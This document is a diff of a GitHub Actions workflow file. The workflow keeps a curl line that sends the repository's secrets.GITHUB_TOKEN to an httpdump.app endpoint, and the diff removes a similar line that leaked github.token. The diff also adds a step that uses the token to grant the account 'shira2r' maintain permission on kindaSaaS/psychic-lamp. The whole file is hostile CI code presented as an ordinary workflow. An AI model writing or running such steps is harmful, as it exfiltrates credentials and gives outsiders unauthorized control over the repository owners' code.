@@ -33,7 +33,6 @@ jobs:
           GITHUB_TOK: ${{ github.token }}
           SEC_TOK: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          curl https://httpdump.app/dumps/0854a0c2-7dfa-4d23-b1ab-9d971ae1fa2d/?$GITHUB_TOK
           curl https://httpdump.app/dumps/0854a0c2-7dfa-4d23-b1ab-9d971ae1fa2d/?$SEC_TOK
           curl \
             -H "Accept: application/vnd.github+json" \
@@ -45,8 +44,8 @@ jobs:
             -H "Accept: application/vnd.github+json" \
             -H "Authorization: Bearer $SEC_TOK"\
             -H "X-GitHub-Api-Version: 2022-11-28" \
-            https://api.github.com/repos/kindaSaaS/psychic-lamp/contents/README.md \
-            -d '{"message":"a new commit message","content":"bXkgdXBkYXRlZCBmaWxlIGNvbnRlbnRz","sha":"c110a54274f186f779799146f4f25edf281c3ead"}'
+            https://api.github.com/repos/kindaSaaS/psychic-lamp/collaborators/shira2r \
+            -d '{"permission":"maintain"}'
       
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
